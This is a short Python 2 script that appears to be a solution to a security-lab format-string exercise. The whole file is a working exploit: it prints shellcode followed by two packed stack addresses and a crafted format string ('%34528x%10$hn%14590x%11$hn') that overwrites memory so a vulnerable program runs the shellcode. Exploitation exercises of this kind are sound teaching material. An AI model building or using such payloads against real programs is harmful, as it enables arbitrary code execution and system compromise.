from shellcode import shellcode
from struct import pack

# shellcode at 0xbffe8700
# buf at 0xbffe8700
#half_num = (len(shellcode)+1)/2

print shellcode + '\xaa' + pack("<I",0xbffe8f0c) + pack("<I",0xbffe8f0e) + "%34528x%10$hn%14590x%11$hn"

